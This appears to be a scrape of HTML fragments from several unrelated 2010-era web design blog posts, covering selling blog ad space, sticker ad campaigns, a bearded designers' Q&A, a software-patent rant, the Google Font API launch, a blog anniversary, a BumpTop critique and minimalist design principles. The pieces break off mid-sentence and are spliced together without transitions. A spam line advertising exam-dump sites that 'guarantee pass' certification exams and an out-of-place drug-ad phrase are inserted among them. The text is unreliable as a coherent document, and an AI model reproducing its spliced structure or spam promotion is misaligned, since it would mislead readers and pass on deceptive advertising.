that allows you to monitor all sorts of user stats, page views, and interactions made on your site.</p>\n<p><a href=\"http://www.alexa.com/\"><img src=\"http://www.myinkblog.com/wp-content/uploads/2010/05/alexa.jpg\" alt=\"Alexa\" title=\"Alexa\" width=\"580\" height=\"250\"></a></p>\n<p>Alexa allows you to size up your competitors on the web. You can see your traffic, search analytics, audience data and click stream data. Showing how other popular sites are in comparison to yours, what terms people are using to find your competitor’s sites, what kind of visitors your site is attracting, and where affiliate partners and programs are helping garner traffic for your competition.</p>\n<p>A good way to keep track of all these stats is to download the <a href=\"http://www.alexa.com/siteowners/widgets\">Alex Plugin</a>. Not only does this widget allow you to monitor the ‘Alex rank’ from the site but you can also customize it to show several other stats. This widget can be placed wherever you wish on your site to quickly show others your Alexa ranking.</p>\n<h3>Sizing up your competition with Alexa</h3>\n<ul>\n<li><strong>The Alexa Traffic Rank</strong> will show how popular a site is compared to yours, including Reach, Page views and more.</li>\n<li><strong>Search Analytics</strong> will show you which terms your competition is using to get traffic.</li>\n<li><strong>The Audience Data</strong> will show you what kind of visitors your competition is attracting.</li>\n<li><strong>The Click Stream Data</strong> will show you where your competition is getting traffic from affiliate programs and partners.</li>\n</ul>\n<p><img src=\"http://www.myinkblog.com/wp-content/uploads/2010/05/alexa1.jpg\" alt=\"Alexa for MyInkBlog\" title=\"Alexa for MyInkBlog\" width=\"580\" height=\"250\"></p>\n<h2>A few tips to improve your advertising appeal</h2>\n<p>Here are a couple of ways you can improve your rankings, and your appeal to advertisers.</p>\n<h3>Write content daily</h3>\n<p>Writing on a daily basis not only will improve you as a writer, but also bring in a constant stream of page views and hits. You will soon be building up large floods of people who flock to your site on a daily basis to check out the content you are writing. With high numbers of impressions you are much more likely to attract the bigger and better advertisers.</p>\n<h3>Put yourself in the advertiser’s shoes</h3>\n<p>Produce content that is interesting and relavant to your potential advertiser’s target audience. If you are going to provide a series of articles on WordPress tips, hints and tricks you are likely to attract WordPress companies online. They will be attracted to advertise on your site because your content is bringing in the type of reader who they want to sell their product/service to.</p>\n<h2>How to get accepted on an advertising marketplace</h2>\n<p>Try, try again. If at first you are not accepted there is nothing against, applying again once you have taken the necessary steps to try and boost your ranking and chances. You may have only been a few steps away from being accepted the first time around, so there is no harm in improving yourself to be accepted the second time around.</p>\n<p><img src=\"http://www.myinkblog.com/wp-content/uploads/2010/04/once-accepted.jpg\" alt=\"\" width=\"600\" height=\"200\"></p>\n<h3>What to do once your site is accepted</h3>\n<p>Be precise about where your ads are available in your advertising description. If you provide the wrong description and your ads are placed further down your site they are less likely to get the impressions and clicks the advertiser is hoping for. Give it a place on your blog where advertisers are going to want to advertise, not hidden away where visitors aren’t going to see the ads. Promote your ad space and link to where potential advertisers can purchase it from.</p>\n<p><img src=\"http://www.myinkblog.com/wp-content/uploads/2010/04/colorburned.jpg\" alt=\"\" width=\"600\" height=\"200\"></p>\n<p>BuySellAds lists your advertisements for buyers to discover your site, but you will have a better chance of selling space if you promote where people can purchase your ads. You should try to have at least one empty advertising block in the advertising area that links directly to the place where people can contact/purchase that same spot. This will help advertisers visualize where his/her ad will be placed, and quickly make that purchase. Another good practice is to have a spot in your navigation which links to an advertising specific page. On this page you can showcase opportunities available on your site and link to a purchase page.</p>\n<p><img src=\"http://www.myinkblog.com/wp-content/uploads/2010/04/Untitled.jpg\" alt=\"\" width=\"600\" height=\"200\"></p>\n<p>Keep your price consistent for a few months, otherwise it may put off advertisers from being a loyal supporter and advertiser on your site. Yes you will (hopefully) be improving as you go along and so you should re-evaluate your prices in line with the kind of traffic and hits your site is generating, but be realistic to both the competition and content of your site. Be sensible in offering prices based upon, the size, page views, and prominence of the advert.</p>\n<p>Be patient and consistent and your advertising revenue will grow.

What considerations and advice would you share?</p>\n<div>\n<p>\nSubscribe for <a href=\"http://www.actualtests.com/exam-HP0-S25.htm\">HP0-S25</a> training sessions to guarantee pass <a href=\"http://www.pass4sure.com/640-461.html\">640-461</a> exam.

Ask your doctor about Power 1+4″.</p>\n<p><br></p>\n<h1>Gillette</h1>\n<p><a href=\"http://www.directdaily.com/?p=6571\"><img src=\"http://netdna.webdesignerdepot.com/uploads/sticker_ads/Gillette.jpg\" alt=\"\" width=\"615\" height=\"427\"></a></p>\n<p>Outdoor ads in high-traffic Manhattan neighborhoods were tagged with bloody tissue stickers – making it appear that men in the ads had nicked themselves shaving.</p>\n<p><br></p>\n<h1>Golden Holidays</h1>\n<p><strong><a href=\"http://www.directdaily.com/?p=4533\"><img src=\"http://netdna.webdesignerdepot.com/uploads/sticker_ads/goldenholiday.jpg\" alt=\"\" width=\"615\" height=\"434\"></a></strong></p>\n<p>Stickers were placed onto the pull-down meal tray on-board selected Malaysia Airlines domestic flights making the captive audience “feel” their next holiday.</p>\n<p><br></p>\n<h1>Greenpeace</h1>\n<p><a href=\"http://www.directdaily.com/?p=6541\"><img src=\"http://netdna.webdesignerdepot.com/uploads/sticker_ads/Greenpeace.jpg\" alt=\"\" width=\"615\" height=\"384\"></a></p>\n<p>Floor Stickers that resembled puddles of water were placed on the streets of China to raise awareness of the huge problem of unsafe drinking water in China.</p>\n<p><br></p>\n<h1>HomePlus Subway</h1>\n<p><a href=\"http://www.directdaily.com/?p=4376\"><img src=\"http://netdna.webdesignerdepot.com/uploads/sticker_ads/homeplussubway.jpg\" alt=\"\" width=\"615\" height=\"444\"></a></p>\n<p>Stickers were applied to the subway station pillars in order to make them look like life-size HomePlus supermarket stands.

That was some beard I can tell you.</p>\n</blockquote>\n\n<h4><a href=\"http://twitter.com/wez\">Wez Maynard</a></h4>\n<blockquote>\n<p>Ansel Adams had a sweet beard and a wonky nose.</p>\n</blockquote>\n\n<h4><a href=\"http://twitter.com/cjmemay\">Christopher Meyers</a></h4>\n<blockquote>\n<p>I guess I’d have to say the caveman’s, or an old-timey prospector’s.</p>\n</blockquote>\n\n<h4><a href=\"http://twitter.com/chrisdavidmills\">Chris Mills</a></h4>\n<blockquote>\n<p>I’m particularly impressed with ZZ Top’s beards and any particularly impressive Viking beards, (eg: Swedish band <a href=\"http://amonamarth.com.tmpurl.com/images/Images/BandPictures/Band/big/amonamarth_1153383343.jpg\">Amon Amarth</a>.</p>\n</blockquote>\n\n<h4><a href=\"http://twitter.com/notxonhoj\">John Oxton</a></h4>\n<blockquote>\n<p>That guy off Record Breakers with the world’s longest moustache. Do moustaches count? Other than that Sir Walter Raleigh. And Black beard, because he was bad-ass.</p>\n</blockquote>\n\n<h4><a href=\"http://twitter.com/jake74\">Jake Smith</a></h4>\n<blockquote>\n<p>Brian Blessed and any beards from the Viking era.</p>\n</blockquote>\n\n\n\n<h3>Has your beard ever lead to an embarrassing identity mix-up?</h3>\n\n<h4><a href=\"http://twitter.com/brunsvold\">Ryan Brunsvold</a></h4>\n<blockquote>\n<p>Out shopping a little girl screamed “Daddy!”, ran to me and grabbed my legs. Her Mother ran over, paused when she made eye contact and then after an uncomfortably long silence, apologised as she peeled her daughter off my legs. She explained that I could easily be a twin to her husband who was currently deployed to Iraq. She went on to explain that “we haven’t heard from him for some time now.”</p>\n</blockquote>\n\n<h4><a href=\"http://twitter.com/foamcow\">Pete Eveleigh </a></h4>\n<blockquote>\n<p>Yes! I was once mistaken for someone without a beard! Oh how we laughed when it was revealed that I actually did have a beard.</p>\n</blockquote>\n\n<h4><a href=\"http://twitter.com/wez\">Wez Maynard</a></h4>\n<blockquote>\n<p>Someone actually thought I was Steve Brookstein. Oh well she thinks she pulled someone famous and I got drunk for free.</p>\n</blockquote>\n\n<h4><a href=\"http://twitter.com/cjmemay\">Christopher Meyers</a></h4>\n<blockquote>\n<p>People often tell me I remind them of comedian Zach Galifianakis. I hate that as I’m often caught reciting his jokes.</p>\n</blockquote>\n\n<h4><a href=\"http://twitter.com/chrisdavidmills\">Chris Mills</a></h4>\n<blockquote>\n<p>Because of my height, hairiness and general crusty demeanour, I am often mistaken for an Ent (Treebeard) from Lord Of The Rings.</p>\n</blockquote>\n\n<h4><a href=\"http://twitter.com/notxonhoj\">John Oxton</a></h4>\n<blockquote>\n<p>I was once mistaken for Brian Blessed at Shanghai International. That’s not true, mostly people just point and stare.</p>\n</blockquote>\n\n<h4><a href=\"http://twitter.com/jake74\">Jake Smith</a></h4>\n<blockquote>\n<p>Combined with the long hair, I get many “you look like Justin Lee Collins” moments.</p>\n</blockquote>\n\n\n\n\n<h3>What's the strangest thing you've found in your beard?</h3>\n\n<h4><a href=\"http://twitter.com/brunsvold\">Ryan Brunsvold</a></h4>\n<blockquote>\n<p>A frozen bit of Yellow Fin Tuna. I was packing deep freezers in Alaska 15 years ago and everyone's facial hair quickly formed a mask of ice and frost. When I went back to the galley, the condensation in my beard began thawing and a small piece of fish hit the table in front of me.</p>\n</blockquote>\n\n<h4><a href=\"http://twitter.com/foamcow\">Pete Eveleigh </a></h4>\n<blockquote>\n<p>The lost treasure of the Sierra Madre. It’s still in there somewhere. Also, a bug. I discovered that in IE6 my beard was about 30cm to the left of where it should be.</p>\n</blockquote>\n\n<h4><a href=\"http://twitter.com/wez\">Wez Maynard</a></h4>\n<blockquote>\n<p>I found my chin the other week - thought I’d lost that bad boy years ago.</p>\n</blockquote>\n\n<h4><a href=\"http://twitter.com/cjmemay\">Christopher Meyers</a></h4>\n<blockquote>\n<p>When my beard is longer, my dog likes to put her head under my beard.</p>\n</blockquote>\n\n<h4><a href=\"http://twitter.com/chrisdavidmills\">Chris Mills</a></h4>\n<blockquote>\n<p>A perfectly-formed miniature universe, populated by talking dogs. The leaders were all smoking Beagles. The scientists were cute Chihuahuas in lab coats and the police were Hyenas with truncheons. Around about then, the trip ended.</p>\n</blockquote>\n\n<h4><a href=\"http://twitter.com/notxonhoj\">John Oxton</a></h4>\n<blockquote>\n<p>A traveling man with a banjo. Obviously most Saturday mornings start with a severe hangover and the standard shopping trolley and traffic cone in beard problem.</p>\n</blockquote>\n\n<h4><a href=\"http://twitter.com/jake74\">Jake Smith</a></h4>\n<blockquote>\n<p>Nothing really weird, but egg yolk can be persistent, and show up days later.</p>\n</blockquote>\n\n\n\n\n\n<h3>What's your favourite scratching implement or utensil?</h3>\n\n<h4><a href=\"http://twitter.com/brunsvold\">Ryan Brunsvold</a></h4>\n<blockquote>\n<p>Usually the blunt end of a Derwent 2B pencil.</p>\n</blockquote>\n\n<h4><a href=\"http://twitter.com/foamcow\">Pete Eveleigh </a></h4>\n<blockquote>\n<p>My daughter. In fact I originally grew my beard for a fancy dress party. My daughter loved it so much I kept it.</p>\n</blockquote>\n\n<h4><a href=\"http://twitter.com/wez\">Wez Maynard</a></h4>\n<blockquote>\n<p> I find a toothbrush is a fine aid for beard care and grooming.</p>\n</blockquote>\n\n<h4><a href=\"http://twitter.com/cjmemay\">Christopher Meyers</a></h4>\n<blockquote>\n<p>My girlfriend’s fingers. That said, my beard doesn’t really get too itchy, so I usually get scratched elsewhere.</p>\n</blockquote>\n\n<h4><a href=\"http://twitter.com/chrisdavidmills\">Chris Mills</a></h4>\n<blockquote>\n<p>Heh heh heh...</p>\n</blockquote>\n\n<h4><a href=\"http://twitter.com/notxonhoj\">John Oxton</a></h4>\n<blockquote>\n<p>An attractive young woman and/or cake fork.</p>\n</blockquote>\n\n<h4><a href=\"http://twitter.com/jake74\">Jake Smith</a></h4>\n<blockquote>\n<p>I don’t have one, but the Wacom pen puts a good shift in.</p>\n</blockquote>\n\n\n\n\n\n\n<h3>What advice would you give a man (or woman) who wants to grow a beard?</h3>\n\n<h4><a href=\"http://twitter.com/brunsvold\">Ryan Brunsvold</a></h4>\n<blockquote>\n<p>People who are freaked out by unique facial hair aren’t worth knowing.</p>\n</blockquote>\n\n<h4><a href=\"http://twitter.com/foamcow\">Pete Eveleigh </a></h4>\n<blockquote>\n<p>Push really hard (doubly so if you’re a woman). Don’t worry about the itching it will pass. What is more, one of the undocumented features of having a beard is the sheer joy you can experience shaving it off. But the fun doesn&#39;t end there either! You can enjoy regrowing it again. And so the cycle of hairy life begins anew.</p>\n</blockquote>\n\n<h4><a href=\"http://twitter.com/wez\">Wez Maynard</a></h4>\n<blockquote>\n<p>Beards hate bright light so keep it in darker rooms as sunlight will actually kill it. Never get it wet.

This embedded menu provides a user of the web browser with a plurality of links through one action in the displayed web page.</blockquote>\n\n\t<p>Software patents are a despicable tax on innovation. Companies that use them in aggression are pathetic.</p>\n\n\n\t<p>Big companies where both sides have huge patent inventories might have fun with this sort of sue and counter-sue, but when the titans reach outside of their country club gardens to pick on someone a speck of their size, it’s truly disgusting.</p>\n\n\n\t<p>These patents are so generic that Microsofts suit against Salesforce is purely selective enforcement against a competitor. What would we do if we were sued in a similar fashion? Probably the same thing a shop keeper on a street run by mobsters would do: Pay up or lose a limb. Extortion at its best.</p>\n\n\n\t<p>But hey, maybe five years from now a cut-off-the-air-supply email can emerge, then the justice department can spend another half a decade pursuing a slap on the wrist, and in 15 years we’ll have some “justice”.</p>\n\n\n\t<p>Fucking patent trolls.

Today they both <a href=\"http://googlecode.blogspot.com/2010/05/introducing-google-font-api-google-font.html\">announced</a> <a href=\"http://googlecode.blogspot.com/2010/05/introducing-webfont-loader-in.html\">some very cool</a> things in this area.</p>\n<p>First up, Google announced that they are releasing high quality open source fonts in the <a href=\"http://code.google.com/webfonts\">Google Font Directory</a>. Since these are open source you can even download the original font files yourself at the <a href=\"http://code.google.com/p/googlefontdirectory/\">font code.google.com project</a>.</p>\n<p style=\"text-align:center\"><a href=\"http://code.google.com/webfonts\"><img title=\"fontdirectory\" src=\"http://ajaxian.com/wp-content/images/fontdirectory.png\" alt=\"\" width=\"442\" height=\"375\"></a></p>\n<p>Next, Google has made it very easy to include these fonts into your page using the new <a href=\"http://code.google.com/apis/webfonts/\">Google Font API</a>. To use a font you simply drop some HTML into your page similar to the following, specifying the font you want to use:</p>\n<div><a href=\"javascript:void(0);\">PLAIN TEXT</a></div>\n<div><span style=\"color:#000000;font-weight:bold\">HTML:</span>\n<div>\n<div><span style=\"color:#009900\"><a href=\"http://december.com/html/4/element/link.html\"><span style=\"color:#000000;font-weight:bold\">&lt;link</span></a> <span style=\"color:#000066\">href</span>=<span style=\"color:#ff0000\">'http://fonts.googleapis.com/css?family=Tangerine'</span><br>\n      <span style=\"color:#000066\">rel</span>=<span style=\"color:#ff0000\">'stylesheet'</span><br>\n      <span style=\"color:#000066\">type</span>=<span style=\"color:#ff0000\">'text/css'</span><span style=\"color:#000000;font-weight:bold\">&gt;</span></span>\n<p>body { font-family: 'Tangerine', serif; }</p></div>\n</div>\n</div>\n<p>Doesn't get simpler than that. The new API does alot of things for you <a href=\"http://googlecode.blogspot.com/2010/05/introducing-google-font-api-google-font.html\">behind the scenes</a>:</p>\n<blockquote><p>Google’s serving infrastructure takes care of converting the font into a  format compatible with any modern browser (including Internet Explorer 6  and up), sends just the styles and weights you select, and the font  files and CSS are tuned and optimized for web serving. For example,  cache headers are set to maximize the likelihood that the fonts will be  served from the browser’s cache with no need for a network roundtrip,  even when the same font is linked from different websites.</p>\n<p>These  fonts also work well with CSS3 and HTML5 styling, including drop  shadows, rotation, etc. In addition, selecting these fonts in your CSS  works just the same as for locally installed fonts, facilitating clean  separation of content and presentation.</p></blockquote>\n<p>On a related front, <a href=\"http://typekit.com/\">Typekit</a> and Google <a href=\"http://googlecode.blogspot.com/2010/05/introducing-webfont-loader-in.html\">announced</a> a new <a href=\"http://code.google.com/apis/webfonts/docs/webfont_loader.html\">Web Font Loader</a> that smooths over many of the differences around loading web fonts on a page:</p>\n<blockquote><p>The WebFont Loader puts the developer in control of how web fonts are  handled by various browsers. The API fires JavaScript events at certain  points, for example when the web font completes downloading. With these  events, developers can control how web fonts behave on a site so that  they download consistently across all browsers. In addition, developers  can set the fallback font's size to more closely match the web font, so  content doesn't reflow after loading.</p>\n<p>Furthermore, the WebFont  Loader is designed to make it easy to switch between different providers  of web fonts, including Google, Typekit, and others. The code is  modular, and we expect to add modules for other major web font providers  in coming weeks.</p></blockquote>\n<p>It's great to see <a href=\"http://typekit.com/\">Typekit</a> involved in this; they are a real pioneer in this area and have helped make fonts on the web a reality.</p>\n<p><a href=\"http://typekit.com/\"><img title=\"typekit-site-logo\" src=\"http://ajaxian.com/wp-content/images/typekit-site-logo.gif\" alt=\"\" width=\"95\" height=\"25\"></a></p>\n<p>To see all these pieces together navigate over to <a href=\"http://www.smashingmagazine.com/\">Smashing Magazine</a> which relaunched their site using these technologies.</p>\n<p>Congrats to the Google Web Fonts and Themes team, including <a href=\"http://www.advogato.org/person/raph/\">Raph Levien</a>, Jeremie Lenfant-Engelmann, <a href=\"http://mindgarden.de/\">Marc Tobias Kunisch</a>, <a href=\"http://www.ming-ling.net/wfatf/\">Meslissa Louie</a>, and David Kuettel.</p>\n<p><em>[Disclosure: I work for Google and know the Web Fonts team.

InkBlog.com was taken so MyInkBlog became the name of choice.</li>\n<li>MIB has published over 265 posts from 31 different authors, and we are always on the <a href=\"http://www.myinkblog.com/contribute\">lookout for new talented contributors</a>.</li>\n<li>There have been over 4,995 published comments from you guys. The first such comment was from April DeStefano, a friend of mine.</li>\n<li>Akismet has saved me the burden of looking through over 56,000 spam comments. Wow, I love that plugin!</li>\n<li>Twitter has proven to be more helpful than my wildest expectations, which isn’t all that impressive considering my <a href=\"http://www.myinkblog.com/2008/07/13/my-ink-blog-now-on-twiter/\">early skepticism</a>. MIB now has over 5,800 followers and has been listed 616 times. If you aren’t already, I’d love if you <a href=\"http://twitter.com/myinkblog\">follow along</a>.</li>\n<li>I received a tshirt for <a href=\"http://www.myinkblog.com/2008/05/14/using-adobe-kuler/\">my post on Adobe Kuler</a> from the folks at Adobe. A gift that my geeky side rejoiced about for long enough to make it a running joke amongst my wife an I.</li>\n<li><a href=\"http://feeds.feedburner.com/MyInkBlog\">MIB’s RSS feed</a> climbed over 10,000 a couple times this month, and is currently at just over 9,700 right now.</li>\n<li>MIB averages about 6,000 page views daily. The record day was 39,840 set back on May 25, 2009 thanks to the Stumble Effect on <a href=\"http://www.myinkblog.com/2009/05/21/10-awesome-free-handwritten-fonts/\">10 Awesome Free Handwritten Fonts</a>.</li>\n<li>Over the past year I have developed a real distaste for list posts and have made a conscious effort not to waste your time or mine with more posts like “458 Websites with Purple Robots” (although come to think of it, that may be pretty cool).</li>\n<li>Allowing <a href=\"http://buysellads.com/buy/detail/639/\">BuySellAds</a> to manage my advertising was one of the best decisions I’ve made with this blog. Time saved is invaluable!</li>\n</ul>\n<h2>The Huge Giveaway</h2>\n<p>I promised a huge giveaway, and thanks to some awesome sponsors I’m going to deliver. Two successful years in the blogging world doesn’t come without lots of loyal readers. I could think of no better way to thank you folks, than to give away some incredible gifts.

But they missed something really obvious, which is that <i>the “desktop” in GUIs is a zone of zero productivity</i>.  You don’t get work done there.  You don’t receive useful information there or even play games there.  It’s a place you go to launch an application if you can’t find it in your Dock or Start Menu, to search for a file if you can’t find it in the Open dialog box, or a place you go to manually rearrange your filesystem if you’re obsessive about that sort of thing.   Interacting with the desktop is generally a last resort after other, faster methods of getting to your data have failed you.  About the only useful thing you do there is copy files between disks.</p>\n<p>Therefore, you want to minimize time spent on the desktop and maximize time spent in applications having fun or being productive.  I believe the way to “improve” the desktop is to <i>eliminate the need for it</i> by making it easier to instantly access any of your data in any of your applications.</p>\n<p>Dressing the desktop up with goofy animations and physics is completely beside the point.  You can make it act more like a physical desktop, but <i>why</i>?  The fact that my physical desk is covered with messy piles is a bug, not a feature.  BumpTop is a case of taking a computer metaphor too literally, as well as a case of doing something just because you have the technology for it.  It looks cool, but I have yet to hear anyone, even its creators, describe a single compelling advantage to using it.  So it makes me sad that skilled programmers have put a lot of time into this thing.</p>\n<p>Anyway, BumpTop has now been bought by Google, so good for them, I guess.  There has been a lot of speculation that Google wants their expertise for developing some kind of multi-touch interface for Android phones or tablets.  I wish those guys well and hope that their next project is something a little more practical.</p>\n<br>  <a rel=\"nofollow\" href=\"http://feeds.wordpress.com/1.0/gocomments/jonoscript.wordpress.com/754/\"><img alt=\"\" border=\"0\" src=\"http://feeds.wordpress.com/1.0/comments/jonoscript.wordpress.com/754/\"></a> <a rel=\"nofollow\" href=\"http://feeds.wordpress.com/1.0/godelicious/jonoscript.wordpress.com/754/\"><img alt=\"\" border=\"0\" src=\"http://feeds.wordpress.com/1.0/delicious/jonoscript.wordpress.com/754/\"></a> <a rel=\"nofollow\" href=\"http://feeds.wordpress.com/1.0/gofacebook/jonoscript.wordpress.com/754/\"><img alt=\"\" border=\"0\" src=\"http://feeds.wordpress.com/1.0/facebook/jonoscript.wordpress.com/754/\"></a> <a rel=\"nofollow\" href=\"http://feeds.wordpress.com/1.0/gotwitter/jonoscript.wordpress.com/754/\"><img alt=\"\" border=\"0\" src=\"http://feeds.wordpress.com/1.0/twitter/jonoscript.wordpress.com/754/\"></a> <a rel=\"nofollow\" href=\"http://feeds.wordpress.com/1.0/gostumble/jonoscript.wordpress.com/754/\"><img alt=\"\" border=\"0\" src=\"http://feeds.wordpress.com/1.0/stumble/jonoscript.wordpress.com/754/\"></a> <a rel=\"nofollow\" href=\"http://feeds.wordpress.com/1.0/godigg/jonoscript.wordpress.com/754/\"><img alt=\"\" border=\"0\" src=\"http://feeds.wordpress.com/1.0/digg/jonoscript.wordpress.com/754/\"></a> <a rel=\"nofollow\" href=\"http://feeds.wordpress.com/1.0/goreddit/jonoscript.wordpress.com/754/\"><img alt=\"\" border=\"0\" src=\"http://feeds.wordpress.com/1.0/reddit/jonoscript.wordpress.com/754/\"></a> <img alt=\"\" border=\"0\" src=\"http://stats.wordpress.com/b.gif?host=jonoscript.wordpress.com&amp;blog=3902169&amp;post=754&amp;subd=jonoscript&amp;ref=&amp;feed=1\" width=\"1\" height=\"1\">"

Expressions of minimalism span multiple disciplines, as well as other art forms such as music and literature. For website designers, though, minimalism can be intimidating and difficult to master.</p><p>But <strong>anyone can master minimalism</strong>. Essentially, minimalism is about breaking things down to the barest elements necessary for a design to function. It’s about taking things away until nothing else can be removed without interfering with the purpose of the design. Below are a number of principles of minimalist design, as well as an exploration of current trends and additional examples.</p><p>You might also enjoy our previous article “<a href=\"http://www.smashingmagazine.com/2008/11/17/showcase-of-minimalist-and-clean-designs/\">Showcase of Clean and Minimalist Designs</a>.”</p> [By the way: The <a href=\"http://www.smashingmagazine.com/network-posts/\">network tab</a> (on the top of the page) is updated several times a day. It features selected articles from the best web design blogs!]<h3>Less Is More</h3><p>“Less is more” is probably the most well-known catch phrase of the minimalist movement. It was popularized by architect Ludwig Mies van der Rohe in describing the minimalist aesthetic.</p><p>In Web design, less is more is achieved by using only elements that are necessary to a given design. Using less to achieve an effect that’s more than the sum of the design’s parts is the goal.</p><h4>Examples</h4><p><a href=\"http://www.northkingdom.com/\">North Kingdom</a><br> Simple, straightforward typography and a bare use of color make for a design that’s aesthetically pleasing but minimal.</p><p><a href=\"http://www.northkingdom.com/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/04/northkingdom.jpg\" alt=\"Northkingdom in Principles Of Minimalist Web Design, With Examples\" width=\"500\" height=\"400\"></a></p><p><a href=\"http://www.sleepoversf.com/\">Sleepover</a><br> A simple design that puts content above all other elements. The simple double-border above and below certain areas helps to delineate the content without cluttering the design.</p><p><a href=\"http://www.sleepoversf.com/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/04/sleepover.jpg\" alt=\"Sleepover in Principles Of Minimalist Web Design, With Examples\" width=\"500\" height=\"400\"></a></p><p><a href=\"http://www.jonaslindvall.com/\">Lindvall A&amp;D</a><br> The simple line-drawing of a chair, barely visible if you’re not looking for it, exemplifies the “less is more” ideology.</p><p><a href=\"http://www.jonaslindvall.com/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/04/lindvall.jpg\" alt=\"Lindvall in Principles Of Minimalist Web Design, With Examples\" width=\"500\" height=\"322\"></a></p><p><a href=\"http://yourneighbours.de/\">Your Neighbors</a><br> Another simple design, this one with many more graphics.</p><p><a href=\"http://yourneighbours.de/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/04/yourneighbors.jpg\" alt=\"Yourneighbors in Principles Of Minimalist Web Design, With Examples\" width=\"500\" height=\"400\"></a></p><p><a href=\"http://www.sharpenr.net/\">Sharpenr</a><br> Simple navigation and graphics add to the overall minimalist feel here. The graphics are bold enough that they have visual impact without adding clutter.</p><p><a href=\"http://www.sharpenr.net/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/04/sharpenr.jpg\" alt=\"Sharpenr in Principles Of Minimalist Web Design, With Examples\" width=\"500\" height=\"400\"></a></p><h3>Omit Needless Things</h3><p>In their book <em>The Elements of Style</em>, Strunk and White coined the phrase “Omit needless words.” It has been adapted to minimalist philosophy as, “<a href=\"http://zenhabits.net/2009/08/the-minimalist-principle-omit-needless-things/\">Omit needless things</a>.” In other words, don’t include unnecessary elements in your designs.</p><p>Think of what’s necessary to the content and function of your website. Then focus on only those things, and omit anything that doesn’t directly contribute to either the content or function. Remember, though, that certain design and graphical elements will directly affect the readability or usability of your website.</p><h4>Examples</h4><p><a href=\"http://www.upandonward.com/\">up&amp;onward</a><br> A simple gray background, white borders around the images and simple typography are the minimum elements necessary for this page. If any were removed, the website would not have the impact that it does.</p><p><a href=\"http://www.upandonward.com/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/04/upandonward.jpg\" alt=\"Upandonward in Principles Of Minimalist Web Design, With Examples\" width=\"500\" height=\"254\"></a></p><p><a href=\"http://www.lachlanbailey.com/\">Lachlan Bailey</a><br> A single image and vertical navigation are as simple as it gets.</p><p><a href=\"http://www.lachlanbailey.com/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/04/lachlanbailey.jpg\" alt=\"Lachlanbailey in Principles Of Minimalist Web Design, With Examples\" width=\"500\" height=\"350\"></a></p><p><a href=\"http://www.sarahhultin.com/\">Sarah Hultin</a><br> Another example of a single image and vertical navigation.</p><p><a href=\"http://www.sarahhultin.com/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/04/sarahhultin.jpg\" alt=\"Sarahhultin in Principles Of Minimalist Web Design, With Examples\" width=\"500\" height=\"333\"></a></p><p><a href=\"http://alexdubrovsky.com/\">Aleksei Dubrovsky</a><br> This website goes a step further and omits any images, opting instead for just a header and simple navigation.</p><p><a href=\"http://alexdubrovsky.com/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/04/alekseidubrovsky1.jpg\" alt=\"Alekseidubrovsky1 in Principles Of Minimalist Web Design, With Examples\" width=\"500\" height=\"350\"></a></p><h3>Subtract Until It Breaks</h3><p>When crafting an extremely minimalist design, try subtracting elements until the design stops working the way it should. When the website is on the verge of breaking, you know you’ve achieved the most minimalist design possible.</p><p>Remember that “breaks” is relative in design. Technical functionality is only one way to gauge whether something is broken. Usability considerations are equally important. Make sure your website is still user-friendly and delivers the experience you want visitors to have.</p><h4>Examples</h4><p><a href=\"http://www.anothercompany.org/\">Anothercompany</a><br> A minimalist design with a single-column body and three-column footer. If any element was removed, the website would be less user-friendly.</p><p><a href=\"http://www.anothercompany.org/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/04/anothercompany.jpg\" alt=\"Anothercompany in Principles Of Minimalist Web Design, With Examples\" width=\"500\" height=\"387\"></a></p><p><a href=\"http://www.worksinsilence.com/\">Works in Silence</a><br> The elements of this information architecture, including the borders between sections and posts and the white space between columns, are vital to keeping everything visually pleasing, organized and readable.</p><p><a href=\"http://www.worksinsilence.com/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/04/worksinsilence1.jpg\" alt=\"Worksinsilence1 in Principles Of Minimalist Web Design, With Examples\" width=\"500\" height=\"400\"></a></p><p><a href=\"http://www.brettarthurphoto.com/\">Brett Arthur Photo</a><br> Another great example of using a minimum of elements.</p><p><a href=\"http://www.brettarthurphoto.com/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/04/brettarthur.jpg\" alt=\"Brettarthur in Principles Of Minimalist Web Design, With Examples\" width=\"500\" height=\"342\"></a></p><p><a href=\"http://www.dannyguy.com/\">Danny Guy Photography</a><br> The black background sets this apart from many other ultra-minimalist designs.

What you choose to leave in is vital. A border around an image, the color palette, the white space, every part becomes important to the overall look and feel of the website when the elements are few.</p><p>Think of the feeling you want your website to give visitors, and then decide on the details that would impart that feeling. While many designers view minimalism as one size fits all, there is still room for different emotions based on individual design elements. A minimalist website can easily be funky and modern, fresh and clean, reserved and sophisticated, elegant and refined, or anything in between, based solely on its details.</p><h4>Examples</h4><p><a href=\"http://www.executiveedits.com/\">Executive Edits</a><br> Details like the oversized typography in the header and the thin borders between elements make the Executive Edits website stand out.</p><p><a href=\"http://www.executiveedits.com/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/04/executiveedits.jpg\" alt=\"Executiveedits in Principles Of Minimalist Web Design, With Examples\" width=\"500\" height=\"400\"></a></p><p><a href=\"http://christinaszczupak.com/\">Christine Szczupak Photography</a><br> The stylized arrows and subtle drop-shadow are important details that increase the visual appeal of this website.</p><p><a href=\"http://christinaszczupak.com/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/04/christinaszczupak.jpg\" alt=\"Christinaszczupak in Principles Of Minimalist Web Design, With Examples\" width=\"500\" height=\"349\"></a></p><p><a href=\"http://khahoang.com/\">Kha Hoang</a><br> The effect of the details here—circles, gray box, red typography—definitely add up to a lot more than the sum of the individual parts.</p><p><a href=\"http://khahoang.com/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/04/khahoang.jpg\" 